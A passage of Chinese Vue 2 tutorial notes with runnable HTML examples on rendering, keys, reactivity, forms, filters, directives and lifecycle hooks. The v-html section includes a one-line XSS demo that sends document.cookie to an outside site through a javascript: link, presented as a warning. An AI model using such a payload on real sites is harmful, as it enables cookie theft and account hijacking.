                   特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
           
       3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
    
       4.v-if与template配合使用，可以避免页面结构发生改变，注意v-show不可以与template一起使用

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>条件渲染</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>当前的n值是{{n}}</h2>
        <button @click='n++'>点我n+1</button>
        <!-- 使用v-show做条件渲染 -->
        <!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
        <!-- <h2 v-show="1===1">欢迎来到{{name}}</h2> -->
        <!-- <h2 v-show="a">欢迎来到{{name}}</h2> -->

        <!-- 适用v-if做条件渲染 -->
        <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
        <!-- <h2 v-if="1===1">欢迎来到{{name}}</h2> -->

        <!-- v-else和v-else-if -->
        <!-- <div v-if="n===1">Augular</div>
        <div v-else-if="n===2">React</div>
        <div>@</div>
        <div v-else-if="n===3">Vue</div>
        <div v-else>haha</div> -->

        <!-- v-if与template配合使用，可以避免页面结构发生改变，注意v-show不可以与template一起使用 -->
        <template v-if="n===1">
            <h2>你好</h2>
            <h2>尚硅谷</h2>
            <h2>北京</h2>
        </template>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        const vm = new Vue({
            el: "#root",
            data: {
                name: "xxc",
                a: false,
                n: 0
            }
        })
    </script>
</body>

</html>
```

## 列表渲染
###  基本列表
     模板字符串中变量来源:1.data中的属性，2.计算属性，3.v-for中的item
     v-for指令:
         1.用于展示列表数据
         2.语法：v-for="(item, index) in xxx" :key="yyy"
         3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>基本列表</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 遍历数组 -->
        <h2>遍历数组</h2>
        <ul>
            <li v-for="(p,index) in persons" :key="index">
                {{p.name}}-{{p.age}}
            </li>
        </ul>
        <!-- 遍历对象 -->
        <h2>遍历对象</h2>
        <ul>
            <li v-for="(value,k) of car" :key="k">
                {{k}}--{{value}}
            </li>
        </ul>
        <!-- 遍历字符串 -->
        <h2>测试遍历字符串(用的少)</h2>
        <ul>
            <li v-for="(char,index) of str" :key="index">
                {{char}}--{{index}}
            </li>
        </ul>
        <!-- 测试遍历指定次数 -->
        <h2>测试遍历指定次数(用的少)</h2>
        <ul>
            <li v-for="(number,index) of 5" :key="index">
                {{index}}--{{number}}
            </li>
        </ul>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                persons: [
                    {
                        id: '001',
                        name: '张三',
                        age: 18
                    },
                    {
                        id: '002',
                        name: '李四',
                        age: 19
                    },
                    {
                        id: '003',
                        name: '王五',
                        age: 20
                    }
                ],
                car: {
                    name: '奥迪A8',
                    price: '70万',
                    color: '黑色'
                },
                str: 'hello'
            }
        })

    </script>
</body>

</html>
```

###  key的原理

    面试题：react、vue中的key有什么作用？（key的内部原理）
            
            1. 虚拟DOM中key的作用：
                            key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
                            随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
                            
            2.对比规则：
                        (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
                                    ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
                                    ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
    
                        (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
                                    创建新的真实DOM，随后渲染到到页面。
                                    
            3. 用index作为key可能会引发的问题：
                                1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
                                                会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
    
                                2. 如果结构中还包含输入类的DOM：
                                                会产生错误DOM更新 ==> 界面有问题。
    
            4. 开发中如何选择key?:
                                1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
                                2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
                                    使用index作为key是没有问题的。
            5.如果不写key,则vue会自动用index作为key的唯一标识。

![](https://img-blog.csdnimg.cn/4e15ce141a004bb393ad12dbca175880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab86463fc1c4ded836b5a5e4f66b4dc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)


```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>2.key的原理</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 遍历数组 -->
        <h2>遍历数组</h2>
        <button @click.once='add'>添加一个老刘</button>
        <ul>
            <li v-for="(p,index) in persons" :key="index">
                {{p.name}}-{{p.age}}
                <input type="text">
            </li>
        </ul>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                persons: [
                    {
                        id: '001',
                        name: '张三',
                        age: 18
                    },
                    {
                        id: '002',
                        name: '李四',
                        age: 19
                    },
                    {
                        id: '003',
                        name: '王五',
                        age: 20
                    }
                ]
            },
            methods: {
                add() {
                    const p = { id: '004', name: '老刘', age: 40 }
                    this.persons.unshift(p)
                }
            }
        })

    </script>
</body>

</html>
```

###  列表过滤
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>3.列表过滤</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 一个字符串默认包含空串'',且用indexof得到0 -->
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p,index) in filPersons" :key="index">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        // 用watch实现
        //#region 
        /* new Vue({
            el: "#root",
            data: {
                keyWord: '',
                persons: [
                    {
                        id: '001',
                        name: '马冬梅',
                        age: 19,
                        sex: '女'
                    },
                    {
                        id: '002',
                        name: '周冬雨',
                        age: 20,
                        sex: '女'

                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 21,
                        sex: '男'
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 22,
                        sex: '男'
                    }
                ],
                filPersons: []
            },
            watch: {
                keyWord: {
                    immediate: true,
                    handler(val) {
                        this.filPersons = this.persons.filter((p) => {
                            return p.name.indexOf(val) !== -1
                        })
                    }
                }
            }
        }) */
        //#endregion

        // 用computed实现
        new Vue({
            el: "#root",
            data: {
                keyWord: '',
                persons: [
                    {
                        id: '001',
                        name: '马冬梅',
                        age: 19,
                        sex: '女'
                    },
                    {
                        id: '002',
                        name: '周冬雨',
                        age: 20,
                        sex: '女'

                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 21,
                        sex: '男'
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 22,
                        sex: '男'
                    }
                ],
            },
            computed: {
                filPersons() {
                    return this.persons.filter((p) => {
                        return p.name.indexOf(this.keyWord) !== -1
                    })
                }
            }
        })

    </script>
</body>

</html>
```

###  列表排序
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>4.列表排序</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 一个字符串默认包含空串'',且用indexof得到0 -->
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <button @click="sortType=2">年龄升序</button>
        <button @click="sortType=1">年龄降序</button>
        <button @click="sortType=0">原顺序</button>
        <ul>
            <li v-for="(p,index) in filPersons" :key="p.id">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        // 用computed实现
        new Vue({
            el: "#root",
            data: {
                keyWord: '',
                sortType: 0,    // 0 代表原顺序，1 代表降序 ， 2代表升序
                persons: [{ id: '001', name: '马冬梅', age: 39, sex: '女' }, { id: '002', name: '周冬雨', age: 11, sex: '女' }, { id: '003', name: '周杰伦', age: 21, sex: '男' }, { id: '004', name: '温兆伦', age: 22, sex: '男' }],
            },
            computed: {
                filPersons() {
                    const arr = this.persons.filter((p) => {
                        return p.name.indexOf(this.keyWord) !== -1
                    })

                    // 判断一下是否需要排序
                    if (this.sortType) {
                        arr.sort((p1, p2) => {
                            return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
                        })
                    }
                    return arr
                }
            }
        })

        // sort函数复习
        let arr = [1, 3, 2, 6, 4, 5]
        arr.sort((a, b) => {
            // 前减后升序，后减前降序，且改变原数组
            return a - b
        })
        console.log(arr)
    </script>
</body>

</html>
```

## 数据监测与数据劫持
###  模拟一个Vue数据监测
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
</head>

<body>
    <script type="text/javascript">

        let data = {
            name: '尚硅谷',
            address: '北京',
        }

        //创建一个监视的实例对象，用于监视data中属性的变化
        const obs = new Observer(data)

        //准备一个vm实例对象
        let vm = {}
        vm._data = data = obs

        function Observer(obj) {
            //汇总对象中所有的属性形成一个数组
            const keys = Object.keys(obj)
            //遍历
            keys.forEach((k) => {
                Object.defineProperty(this, k, {
                    get() {
                        return obj[k]
                    },
                    set(val) {
                        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                        obj[k] = val
                    }
                })
            })
        }

    </script>
</body>

</html>
```

###   Vue.set的使用
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>8.Vue.set的使用</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- vue中undefined不会显示，student存在,student.age不存在，则不会报错 -->
    <!-- 准备好一个容器-->
    <div id="root">
        <h1>学校信息</h1>
        <h2>学校名称：{{school.name}}</h2>
        <h2>学校地址：{{school.address}}</h2>
        <h2>校长是:{{school.leader}}</h2>
        <hr>
        <h1>学生信息</h1>
        <button @click="addSex()">添加一个信息属性,默认值为男</button>
        <h2>学生姓名:{{student.name}}</h2>
        <h2 v-if="student.sex">学生性别:{{student.sex}}</h2>
        <h2>学生年龄:真实{{student.age.rAge}},对外{{student.age.sAge}}</h2>
        <h2>朋友们</h2>
        <ul>
            <li v-for='(f,index) in student.friends' :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            school: {
                name: '尚硅谷',
                address: '北京',
            },
            student: {
                name: 'tom',
                // sex: '男',
                age: {
                    rAge: 40,
                    sAge: 29,
                },
                friends: [
                    { name: 'jerry', age: 35 },
                    { name: 'tony', age: 36 }
                ]
            }
        },
        methods: {
            addSex() {
                // Vue.set(this.student, 'sex', '男')
                this.$set(this.student, 'sex', '男')
            }
        }
    })
</script>

</html>
```

### 总结

    数据劫持:将data中的值变为包含getter、setter的样子。
    Vue监视数据的原理：
    	1. vue会监视data中所有层次的数据。
    
    	2. 如何监测对象中的数据？
    		通过setter实现监视，且要在new Vue时就传入要监测的数据。
    			(1).对象中后追加的属性，Vue默认不做响应式处理
    			(2).如需给后添加的属性做响应式，请使用如下API：
    							Vue.set(target，propertyName/index，value) 或 
    							vm.$set(target，propertyName/index，value)
    
    	3. 如何监测数组中的数据？
    						通过包裹数组更新元素的方法实现，本质就是做了两件事：
    							(1).调用原生对应的方法(7个)对数组进行更新。
    							(2).重新解析模板，进而更新页面。
    
    	4.在Vue修改数组中的某个元素一定要用如下方法：
    				1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
    				2.Vue.set() 或 vm.$set()
    	
    	特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>总结数据监视</title>
    <style>
        button {
            margin-top: 10px;
        }
    </style>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器-->
    <div id="root">
        <h1>学生信息</h1>

        <button @click="student.age++">年龄+1岁</button> <br />
        <button @click="addSex">添加性别属性，默认值：男</button> <br />
        <button @click="student.sex = '未知' ">修改性别</button> <br />
        <button @click="addFriend">在列表首位添加一个朋友</button> <br />
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
        <button @click="addHobby">添加一个爱好</button> <br />
        <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />

        <h3>姓名：{{student.name}}</h3>
        <h3>年龄：{{student.age}}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            student: {
                name: 'tom',
                age: 18,
                hobby: ['抽烟', '喝酒', '烫头'],
                friends: [
                    { name: 'jerry', age: 35 },
                    { name: 'tony', age: 36 }
                ]
            }
        },
        methods: {
            addSex() {
                // Vue.set(this.student, 'sex', '男')
                this.$set(this.student, 'sex', '男')
            },
            addFriend() {
                // 数组后添加的对象中的属性也是响应式的
                this.student.friends.unshift({ name: 'jack', age: 70 })
            },
            updateFirstFriendName() {
                this.student.friends[0].name = '张三'
                this.student.friends[0].age = 5
            },
            addHobby() {
                this.student.hobby.push('学习')
            },
            updateHobby() {
                // this.student.hobby.splice(0, 1, '开车')
                // Vue.set(this.student.hobby, 0, '开车')
                this.$set(this.student.hobby, 0, '开车')
            },
            removeSmoke() {
                // 不是由vue控制的函数，尽量写成箭头函数
                this.student.hobby = this.student.hobby.filter((h) => {
                    return h !== '抽烟'
                })
            }
        }
    })
</script>

</html>
```

## 收集表单数据
        收集表单数据：
                若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
                若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
                若：<input type="checkbox"/>
                        1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                        2.配置input的value属性:
                                (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                                (2)v-model的初始值是数组，那么收集的的就是value组成的数组
                备注：v-model的三个修饰符：
                                lazy：失去焦点再收集数据
                                number：输入字符串转为有效的数字
                                trim：输入首尾空格过滤

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>收集表单数据</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <form @submit.prevent="demo">
            <!-- <label for="demo">账号: </label>
            <input type="text" id="demo"> -->
            账号: <input type="text" v-model.trimz="userInfo.account"> <br><br>
            密码: <input type="password" v-model="userInfo.password"> <br><br>
            年龄: <input type="number" v-model.number="userInfo.age"> <br><br>
            性别:
            男 <input type="radio" name="sex" v-model="userInfo.sex" value="male">
            女 <input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br><br>
            爱好:
            学习 <input type="checkbox" v-model="userInfo.hobby" value="study">
            打游戏 <input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭 <input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br><br>
            所属校区
            <select v-model='userInfo.city'>
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shengzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select>
            <br><br>
            其他信息:
            <textarea v-model.lazy='userInfo.other'></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree"> 阅读并接收 <a href="www.baidu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    age: 18,
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    agree: ''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.userInfo))
                }
            }
        })
    </script>
</body>

</html>
```

## 过滤器
    过滤器：
        定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
        语法：
                1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
                2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
        备注：
                1.过滤器也可以接收额外参数、多个过滤器也可以串联
                2.并没有改变原本的数据, 是产生新的对应的数据
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>过滤器</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="../js/day.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>显示格式化后的时间</h2>
        <!-- 计算属性实现 -->
        <h3>现在是:{{fmtTime}}</h3>
        <!-- methods实现 -->
        <h3>现在是:{{getFmtTime()}}</h3>
        <!-- 过滤器实现 -->
        <h3>现在是:{{time | timeFormater}}</h3>
        <!-- 过滤器实现(传参) -->
        <!-- time会作为参数给timeFormater,而timeFormater的返回值又作为参数传给mySlice -->
        <h3>现在是:{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
        <h3 :x="msg | mySlice">尚硅谷</h3>

        <input type="text" v-model="msg | mySlice">
    </div>
    <div id="root2">
        <h2>{{msg|mySlice}}</h2>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        new Vue({
            el: "#root",
            data: {
                time: 1621561377603, // 时间戳
                msg: '你好，尚硅谷'
            },
            methods: {
                getFmtTime() {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            computed: {
                fmtTime() {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            // 局部的过滤器
            filters: {
                timeFormater(value, str = 'YYYY-MM-DD HH:mm:ss') {
                    // console.log('@', value)
                    return dayjs(value).format(str)
                }
            }
        })

        new Vue({
            el: "#root2",
            data: {
                msg: "hello,atguigu"
            }
        })
    </script>
</body>

</html>
```

## 内置指令
###  v-text
    我们学过的指令：
             v-bind	: 单向绑定解析表达式, 可简写为 :xxx
             v-model	: 双向数据绑定
             v-for  	: 遍历数组/对象/字符串
             v-on   	: 绑定事件监听, 可简写为@
             v-if 	 	: 条件渲染（动态控制节点是否存存在）
             v-else 	: 条件渲染（动态控制节点是否存存在）
             v-show 	: 条件渲染 (动态控制节点是否展示)
     v-text指令：
             1.作用：向其所在的节点中渲染文本内容。
             2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>v-text_指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name">你好，</div>
        <div v-text="str"></div>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                name: "xxc",
                str: '<h3>你好啊!</h3>'
            }
        })
    </script>
</body>

</html>
```

###  v-html
      v-html指令：
              1.作用：向指定节点中渲染包含html结构的内容。
              2.与插值语法的区别：
                          (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                          (2).v-html可以识别html结构。
              3.严重注意：v-html有安全性问题！！！！
                          (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                          (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
####  Cookie图解
![在这里插入图片描述](https://img-blog.csdnimg.cn/84c165bdd03b4fa9bf03ae6434f7fe75.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a709a220249e45d0a7004538c5f2090f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

####  v-html的安全性问题
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>v-html_指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <div>你好,{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                name: "尚硅谷",
                str: '<h3>你好啊!</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>哈哈哈哈哈哈哈</a></a>'
            }
        })
    </script>
</body>

</html>
```
> 此时，若在百度贴吧用户输入的内容中使用v-html进行内容渲染，恶意用户就可以通过document.cookie来进行恶意引导用户点击来获取其它用户的cookie数据。此即为XSS攻击。

###  v-cloak
    v-cloak指令（没有值）：
            1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
            2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>v-cloak指令</title>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
    <!-- 引入Vue -->
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <!-- 若把script放在此处会导致5s的未渲染页面 -->
    <!-- <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script> -->

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                name: "xxc"
            }
        })
    </script>
</body>

</html>
```

### v-once
        v-once指令：
                    1.v-once所在节点在初次动态渲染后，就视为静态内容了。
                    2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>v-once指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 v-once>初始化的n值是:{{n}}</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        new Vue({
            el: "#root",
            data: {
                n: 1
            }
        })
    </script>
</body>

</html>
```

### v-pre

        v-pre指令：
                1.跳过其所在节点的编译过程。
                2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>v-pre指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        new Vue({
            el: "#root",
            data: {
                n: 1
            }
        })
    </script>
</body>

</html>
```

## 自定义指令

	 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
	 需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
	 自定义指令总结：
	         一、定义语法：
	        (1).局部指令：
	                    new Vue({															new Vue({
	                        directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
	                    }) 																		})
	        (2).全局指令：
	                        Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
	
	     二、配置对象中常用的3个回调：
	                 (1).bind：指令与元素成功绑定时调用。
	                 (2).inserted：指令所在元素被插入页面时调用。
	                 (3).update：指令所在模板结构被重新解析时调用。
	
	     三、备注：
	                 1.指令定义时不加v-，但使用时要加v-；
	                 2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。此时directives中的对象名要用字符串形式。
	                 3.directives中的this指向为window
	                 4.自定义指令何时会被调用？ 1.指令与元素成功绑定时（一上来)（并不是渲染到页面时。而Vue是先绑定再渲染的）。2.指令所在的模板被重新解析时。（name被改变时也会改变n）

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>自定义指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h2>尚硅谷</h2>
        <h2>当前的n值是：<span v-text="n"></span></h2>
        <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span></h2> -->
        <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
        <button @click="n++">点我n+1</button>
        <hr>
        <input type="text" v-fbind:value="n">
    </div>

    <div id="root2">
        <input type="text" v-fbind:value="n">
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        // 定义全局指令
        Vue.directive('fbind', {
            // 指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            // 指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus()
            },
            // 指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        })

        /*  Vue.directive('big', function (element, binding) {
             console.log('big', this)  // 注意此处的this是window
             element.innerText = binding.value * 10
         }) */

        new Vue({
            el: "#root",
            data: {
                name: '尚硅谷',
                n: 1
            },
            directives: {
                big(element, binding) {
                    console.log('big', this)  // 注意此处的this是window
                    // big函数何时会被调用？ 1.指令与元素成功绑定时（一上来)（并不是渲染到页面时。而Vue是先绑定再渲染的）。2.指令所在的模板被重新解析时。（name被改变时也会改变n）
                    element.innerText = binding.value * 10
                    // console.log(element instanceof HTMLElement) //true
                },
                /* 'big-number'(element, binding) {
                    element.innerText = binding.value * 10
                    console.log(element, binding)
                }, */
            }
        })

        new Vue({
            el: '#root2',
            data: {
                n: 1
            }
        })
    </script>
</body>

</html>
```

## 生命周期
###  引出生命周期

     生命周期：
             1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
             2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
             3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
             4.生命周期函数中的this指向是vm 或 组件实例对象。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>引出生命周期</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 :style="{opacity}">欢迎学习Vue</h2>
        <!--{{methods方法调用}}-->
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                opacity: 1
            },
            // 通过methods实现，无法实现。因为只要改了data中的数据，vue就会重新解析模板
            methods: {
            },
            // Vue完成模板的解析并把初始的真实的DOM元素放入页面后（挂载完毕，只会执行一次）调用mounted
            mounted() {
                console.log('mounted')
                setInterval(() => {
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16)
            }
        })

        // 通过外部的定时器实现（不推荐）
        /* setInterval(() => {
            vm.opacity -= 0.01
            if (vm.opacity <= 0) vm.opacity = 1
        }, 16) */
    </script>
</body>

</html>
```

###  生命周期图解
<img src="https://img-blog.csdnimg.cn/fd1bad8d6df44433b949656f56d01bdf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70" alt="请添加图片描述" style="zoom:150%;" />

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>分析生命周期</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 注意：div也作为vm的模板 -->
    <div id="root">
        <h2 v-text="n"></h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="add">点我n+1</button>
        <!-- 此时只会销毁自定义事件，而不会销毁原生DOM事件，即add还可以输出 -->
        <button @click="bye">点我销毁vm</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#root',
        // 写template时，要保证根节点只有一个（且不能用template作为根元素），且会导致 <div id="root"> 消失
        /* template: `        
        <div>
